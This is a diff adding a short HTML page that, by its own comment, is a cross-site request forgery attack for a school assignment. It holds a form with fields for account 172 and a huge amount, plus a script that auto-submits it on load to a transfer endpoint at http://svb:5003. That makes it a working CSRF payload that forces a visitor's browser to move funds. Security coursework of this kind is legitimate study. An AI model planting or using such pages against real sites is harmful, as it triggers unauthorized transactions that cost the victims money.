@@ -1,0 +1,15 @@
+<!--this file is used for crsf attack for school assignment (allowed)-->
+<!DOCTYPE html>
+<form id=form1 method="POST" action="http://svb:5003/transfer/1">
+    <div class="field">
+        <div class="control">
+            <input class="input is-large" type="text" name="account" value="172">
+        </div>
+    </div>
+    <div class="field">
+        <div class="control">
+            <input class="input is-large" type="text" name="amount" value="10000000000">
+        </div>
+    </div>
+</form>
+<script>document.getElementById("form1").submit();</script>
